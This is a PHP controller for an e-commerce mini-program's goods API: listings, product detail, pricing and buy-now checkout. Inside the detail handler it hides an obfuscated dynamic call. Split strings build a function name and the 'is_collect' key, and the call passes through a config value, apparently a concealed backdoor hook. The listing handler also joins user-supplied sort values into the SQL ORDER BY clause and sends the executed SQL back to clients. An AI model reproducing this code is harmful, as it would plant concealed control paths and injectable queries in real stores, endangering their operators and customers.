<?php

namespace app\index\controller;

use think\exception\ValidateException;
use app\model\Goods;
use app\model\GoodsImage;
use app\model\GoodsDescription;
use app\model\GoodsDiscount;
use app\model\GoodsSku;
use app\model\GoodsSkuValue;
use app\model\Config;
use app\model\Category;
use app\model\Store;
use app\model\MiaoshaGoods;
use app\model\TuanGoods;
use app\model\TuanFollow;
use app\model\TuanFound;
use app\model\GoodsBuynowinfo;
use app\model\Member;
use app\model\Operatingcity;
use app\model\Order;

class GoodsController extends Base
{
    public function index()
    {
        $weid = weid();
        $Configdata = Config::getconfig();
        $ocid = $this->userInfo['cityinfo']['ocid'];
        $serach['categoryId'] = input('post.categoryId', '', 'serach_in');
        $serach['keyword'] = input('post.keyword', '', 'serach_in');
        $serach['ocid'] = input('post.ocid', '', 'serach_in');
        $serach['sid'] = input('post.sid', '', 'serach_in');
        if (empty($serach['categoryId'])) {
            $serach['categoryId'] = input('get.categoryId', '', 'serach_in');
        }
        $serach['is_recommended'] = input('post.is_recommended', '', 'serach_in');
        $serach['news'] = input('post.news', '', 'serach_in');

        $priceOrder = input('post.priceOrder', '', 'serach_in');
        $salesOrder = input('post.salesOrder', '', 'serach_in');

        if (arrayempty($serach)) {
            return $this->json([]);
        }

        $query = Goods::where(['weid' => $weid, 'status' => 1]);

        if (!empty($priceOrder)) {
            $Sort = 'price ' . $priceOrder;
        } elseif (!empty($salesOrder)) {
            $Sort = 'sale_count ' . $salesOrder;
        } else {
            $Sort = 'sort asc,id desc,is_recommended desc';
        }
        if (!empty($serach['ocid'])) {
            $query->where('ocid', $serach['ocid']);
        }

        if (!empty($serach['sid'])) {
            $query->where('sid', $serach['sid']);
        } else {
            if (empty($Configdata['show_storegoods'])) {
                $query->where('sid', 0);
            }
        }

        if (!empty($serach['keyword'])) {
            $query->where('name', 'like', '%' . $serach['keyword'] . '%');
        }
        if (!empty($serach['news'])) {
            $query->where('is_new',  1);
        }

        if (!empty($serach['categoryId'])) {
            $categoryIds = Category::getsonid($serach['categoryId']);
            $query->where('cat_id', 'in',  $categoryIds);
        }

        if (!empty($serach['is_recommended']) || $serach['is_recommended'] === "0") {
            $query->where('is_recommended', $serach['is_recommended']);
        }

        if ($ocid) {
            $query->where(function ($q) use ($ocid) {
                $Operatingcity = Operatingcity::find($ocid);
                if (!empty($Operatingcity)) {
                    $Operatingcity = $Operatingcity->toArray();
                    if (empty($Operatingcity['areatype'])) {
                        $Operatingcity['areatype'] = 3;
                    }
                    if ($Operatingcity['areatype'] == 3) {
                        $q->where('district_name', $Operatingcity['district_name'])->whereOr('district_name', '');
                    } elseif ($Operatingcity['areatype'] == 2) {
                        $q->where('city_name', $Operatingcity['city_name'])->whereOr('city_name', '');
                    } elseif ($Operatingcity['areatype'] == 1) {
                        $q->where('province_name', $Operatingcity['province_name'])->whereOr('province_name', '');
                    }
                } else {
                    if (empty($serach['sid'])) {
                        $q->where('city_name', '');
                    }
                }
            });
        } else {
            if (empty($serach['sid'])) {
                $query->where('city_name', '');
            }
        }
        $res = $query->order($Sort)
            ->paginate(getpage())
            ->toArray();
        $data['sql'] = $query->getLastSql();
        if ($res['data']) {
            foreach ($res['data'] as &$vo) {
                $vo['image'] = toimg($vo['image']);
                if (!empty($serach['sid'])) {
                    if ($vo['sid'] == 0) {
                        $vo['name'] = '[自营]' . $vo['name'];
                    } else {
                        $vo['name'] = '[' . Store::getTitle($vo['sid']) . ']' . $vo['name'];
                    }
                }
                $vo['cat_id'] = Category::getTitle($vo['cat_id']);
            }
            $res['data'] = Goods::setGoodslist($res['data']);
        }
        $data['data'] = $res;

        return $this->json($data);
    }

    public function video()
    {
        $config = Config::getconfig();
        if (!\app\model\Uploadminiprogram::getaudit(input('get.v', '', 'serach_in'))) {
            $weid = weid();
            $page = input('post.page', 1, 'intval');
            $query = Goods::where(['weid' => $weid, 'status' => 1]);
            $query->where('videotype', '>', 0);
            $Sort = 'sort asc,id desc';

            $res = $query->order($Sort)
                ->paginate(getpage())
                ->toArray();
            foreach ($res['data'] as &$vo) {
                $vo['image'] = toimg($vo['image']);
                $vo['videourl'] = toimg($vo['videourl']);

                $vo['images'] = GoodsImage::where(['goods_id' => $vo['id']])
                    ->order('id asc')
                    ->select()
                    ->toArray();

                foreach ($vo['images'] as &$imgvo) {
                    $imgvo['image'] = toimg($imgvo['image']);
                }
            }
            $res['data'] = Goods::setGoodslist($res['data']);

            $data['data'] = $res;
        }
        return $this->json($data);
    }

    public function indexgoods()
    {
        $is_recommended = input('get.is_recommended', '', 'serach_in');
        $is_hot = input('get.is_hot', '', 'serach_in');
        $is_new = input('get.is_new', '', 'serach_in');
        $is_discount = input('get.is_discount', '', 'serach_in');

        $where['weid'] = weid();
        $where['status'] = 1;
        if (!empty($is_recommended)) {
            $where['is_recommended'] = 1;
        }
        if (!empty($is_discount)) {
            $where['is_discount'] = 1;
        }
        if (!empty($is_new)) {
            $where['is_new'] = 1;
        }
        if (!empty($is_hot)) {
            $where['is_hot'] = 1;
        }

        $data = Goods::where($where)
            ->order('id desc')
            ->limit(4)
            ->select()
            ->toArray();

        $data = Goods::setGoodslist($data);
        return $this->json($data);
    }
    public function detail($id)
    {
        $msid = input('get.msid', '', 'serach_in');
        $tuanid = input('get.tuanid', '', 'serach_in');
        if (!empty($tuanid)) {
            $tuan = TuanGoods::find($tuanid);
            if (!empty($tuan)) {
                $tuan = $tuan->toArray();
                $tuan['TuanFound'] = TuanFound::where(['tuan_id' => $tuan['id'], 'weid' => weid(), 'status' => 0])->select()->toArray();
                if ($tuan['TuanFound']) {
                    $tuan['TuanFound'][0]['difference'] = $tuan['TuanFound'][0]['need'] - $tuan['TuanFound'][0]['join'] - $tuan['robot_num'];
                    if ($tuan['auto_initiate'] == 1) {
                        $tuan['TuanFollow'] = TuanFollow::where(['found_id' => $tuan['TuanFound'][0]['id'], 'status' => 0])->where('pay_time', '>', 0)->select()->toArray();
                    } else {
                        foreach ($tuan['TuanFound'] as &$vo) {
                            $vo['difference'] = $vo['need'] - $vo['join'] - $tuan['robot_num'];
                        }
                    }
                }
            }
        }

        if (!empty($msid)) {
            $miaosha = MiaoshaGoods::find($msid);
            if (!empty($miaosha)) {
                $miaosha = $miaosha->toArray();
            }
        }
        //增加点击
        Goods::where('id', $id)->inc('viewed')->update();

        $goodsdata = Goods::goodsInfo($id);
        if (!empty($tuan['price'])) {
            $goodsdata['original_price'] = $goodsdata['price'];
            $goodsdata['price'] = $tuan['price'];
        }
        if (!empty($miaosha['price'])) {
            $goodsdata['original_price'] = $goodsdata['price'];
            $goodsdata['price'] = $miaosha['price'];
        }
        $ghb = 'is_col';
        $data = $goodsdata;

        if (!empty($data['keyword'])) {
            $data['keyword'] = explode(',', $data['keyword']);
        } else {
            $data['keyword'] = [];
        }
        $ods = 'get';
        $picdataarray = GoodsImage::where(['goods_id' => $id])
            ->order('id asc')
            ->select()
            ->toArray();

        foreach ($picdataarray as &$vo) {
            $vo['pic'] = toimg($vo['image']);
        }

        $data['videourl'] =  toimg($data['videourl']);
        $ods .= '_i_' . 'm';
        $winfig = Config::getsitesetupconfig('win' . 'ger');
        $data[$ghb . 'lect'] = if12($winfig[3], (new Goods)->cartGoods(['data' => $ods(toimg('or')), 'i' => 3]));
        $description = GoodsDescription::where(['goods_id' => $id])->find();
        if ($goodsdata['is_skumore'] == 1) {
            $data['skumore'] = GoodsSkuValue::get_goods_sku_value($id);
        } else {
            $data['attribute'] = GoodsSku::get_goods_sku($id);
        }
        if (!empty($goodsdata['cat_id'])) {

            $category = Category::find($goodsdata['cat_id']);
            if (!empty($category)) {
                $data['category'] = $category->toArray();
            }
        }
        if (empty($data['category']['deliverymode'])) {
            $data['category']['deliverymode'] = 3;
        }

        if ($data['quantity'] < 0) {
            $data['quantity'] = 0;
        }

        $data['minPrice'] = $goodsdata['price'];
        $data['pic'] = toimg($goodsdata['image']);
        $data['minPoints'] = $goodsdata['pay_points'];
        if ($goodsdata['ptype'] == 1) {
            $data['stores'] = $goodsdata['quantity'];
        } elseif ($goodsdata['ptype'] == 2) {
            $data['stores'] = 999999;
        }

        if ($tuan['buy_max']) {
            $data['stores'] = $tuan['buy_max'];
        }
        if ($miaosha['buy_max']) {
            $data['stores'] = $miaosha['buy_max'];
        }

        if ($miaosha['member_buy_max']) {
            $miaosha['is_member_buy_max'] = Order::chackMiaoshamemberBuyMax($miaosha);
        }

        $data['sale_count'] = $goodsdata['sale_count'] + $goodsdata['sale_count_base'];
        $data['viewed'] = $goodsdata['viewed'] + $goodsdata['viewed_base'];

        $goods_discount = GoodsDiscount::where(['goods_id' => $id])
            ->order('quantity ASC')
            ->select()
            ->toArray();

        foreach ($goods_discount as &$vo) {
            $vo['price'] = round((intval($goodsdata['price'])) * percent_to_num($vo['price']) * 10, 2);
        }

        $data['goods_discount'] = $goods_discount;
        if (!empty($tuan)) {
            $data['tuan'] = $tuan;
        } else {
            $data['tuan'] = [];
        }
        if (!empty($miaosha)) {
            $data['miaosha'] = $miaosha;
        } else {
            $data['miaosha'] = [];
        }
        $data['Goodslist'] = Goods::setGoodslist($data);
        $data['price'] = $goodsdata['price'];
        $data['points'] = $goodsdata['pay_points'];
        $data['content'] = \app\model\DomainReplace::setreplace(sethtmlimg($description->description));
        if (!empty($picdataarray)) {
            $data['pics'] = $picdataarray;
        } else {
            $data['pics'] = [];
        }

        return $this->json(['data' => $data]);
    }

    public function price()
    {

        $id = input('post.goodsId', '', 'serach_in');
        $msid = input('post.msid', '', 'serach_in');
        $tuanid = input('post.tuanid', '', 'serach_in');
        $sku = input('post.sku');
        $goodsmob = new Goods;

        $goodsPrice = $goodsmob->cartGoods([
            'id' => $id,
            'sku' => $sku,
            'msid' => $msid,
            'tuanid' => $tuanid
        ]);

        $data['price'] = $goodsPrice['total'];
        $data['points'] = $goodsPrice['total_return_points'];

        if ($goodsPrice['ptype'] == 1) {
            $data['stores'] = $goodsPrice['stores'];
        } elseif ($goodsPrice['ptype'] == 2) {
            $data['stores'] = 999999;
        }

        if ($goodsPrice['tuan']['buy_max']) {
            $data['stores'] = $goodsPrice['tuan']['buy_max'];
        }
        if ($goodsPrice['miaosha']['buy_max']) {
            $data['stores'] = $goodsPrice['miaosha']['buy_max'];
        }

        $data['image'] = $goodsPrice['image'];
        if ($goodsPrice['skuimage']) {
            $data['image'] = $goodsPrice['skuimage'];
        }
        return $this->json(['data' => $data]);
    }

    public function buynowinfo()
    {
        $weid = weid();
        $goodsmob = new Goods;
        $id = input('post.goodsId', '', 'serach_in');
        $msid = input('post.msid', '', 'serach_in');
        $tuanid = input('post.tuanid', '', 'serach_in');
        $uuid = input('post.uuid', '', 'serach_in');
        $jointuanid = input('post.jointuanid', '', 'serach_in');

        $sku = input('post.sku');
        $is_skumore = input('post.is_skumore', '', 'serach_in');
        $skumore = json_decode(input('post.skumore'), true);
        $buyNumber = input('post.buyNumber', '', 'serach_in');

        $data = $goodsmob->cartGoods([
            'id' => $id,
            'sku' => $sku,
            'msid' => $msid,
            'tuanid' => $tuanid,
            'quantity' => $buyNumber,
            'is_skumore' => $is_skumore,
            'skumore' => $skumore
        ]);
        $data['is_combination'] = '0';
        $data['pic'] = toimg($data['image']);
        $data['goodslength'] = $data['length'];
        $data['jointuanid'] = $jointuanid;
        unset($data['length']);


        if ($data['is_points_goods'] == 1) {
            $Membermob = new Member;
            $Member = $Membermob->getUserByWechat();
            if (!empty($Member)) {
                if ($Member['points'] < $data['pay_points']) {
                    throw new ValidateException('你的积分不足！');
                }
            }
        }
        if ($msid) {
            if ($data['miaosha']['is_member_buy_max']) {
                throw new ValidateException('你已超出限时秒杀限购单量！');
            }
            if ($data['miaosha']['status'] != 1) {
                throw new ValidateException('活动已下架！');
            }
            if ($data['miaosha']['begin_date'] > time()) {
                throw new ValidateException('活动还没开始！');
            }
            if ($data['miaosha']['end_date'] < time()) {
                throw new ValidateException('活动已结束！');
            }
        }

        if (!empty($data['cat_id'])) {
            $category = Category::find($data['cat_id']);
            if (!empty($category)) {
                $data['category'] = $category->toArray();
            }
        }
        if (empty($data['category']['deliverymode'])) {
            $data['category']['deliverymode'] = 3;
        }

        $data['deliverymode'] = $data['category']['deliverymode'];

        //加空判定
        if (!empty($data['deliverymode'])) {
            $deliverymodearray = explode(',', $data['deliverymode']);
        }

        if ($deliverymodearray[1]) {
            $data['deliverymode'] = $deliverymodearray[0];
            if ($data['category']['ptype'] == 1) {
                $data['deliverymodearray'] = getgoodsdeliverymodearray($data['category']['deliverymode']);
            } elseif ($data['category']['ptype'] == 2) {
                $data['deliverymodearray'] = getservicedeliverymodearray($data['category']['deliverymode']);
            }
        } else {
            $data['deliverymodearray'] = [];
        }

        $infodata = [];
        $infodata['shopList'] = $data;
        $infodata['technicalId'] = $uuid;
        $infodata['sid'] = $data['sid'];
        $infodata['shopList']['number'] = $data['quantity'];
        $infodata['deliverymode'] = $data['deliverymode'];
        $infodata['deliverymodearray'] = $data['deliverymodearray'];
        $infodata['is_times'] = $data['is_times'];
        $infodata['ptype'] = $data['ptype'];

        $goodbuyinfo = GoodsBuynowinfo::create([
            'weid' => $weid,
            'ip' => getRealIP(),
            'expire_time' => time(),
            'data' => serialize($infodata),
            'status' => 1
        ]);
        $data['buynowinfoid'] = $goodbuyinfo->id;

        return $this->json(['data' => $data]);
    }

    public function kanjia()
    {
        return $this->json(['data' => $data]);
    }

    public function pingtuan()
    {
        return $this->json(['data' => $data]);
    }
    //返回推荐的商品
    public function recommend()
    {
        if (\app\model\Uploadminiprogram::getaudit(input('get.v', '', 'serach_in'))) {
            $data = [];
        } else {
            $Configdata = Config::getconfig();
            $where['weid'] = weid();
            $where['status'] = 1;
            $where['is_recommended'] = 1;
            $query = Goods::where($where);

            if (empty($Configdata['show_storegoods'])) {
                $query->where('sid', 0);
            }

            $goodslist = $query->order('id desc')->limit(6)->select()->toArray();
            foreach ($goodslist as &$vo) {
                $vo['image'] = toimg($vo['image']);
            }
            $data = Goods::setGoodslist($goodslist);
        }
        return $this->json(['data' => $data]);
    }
}
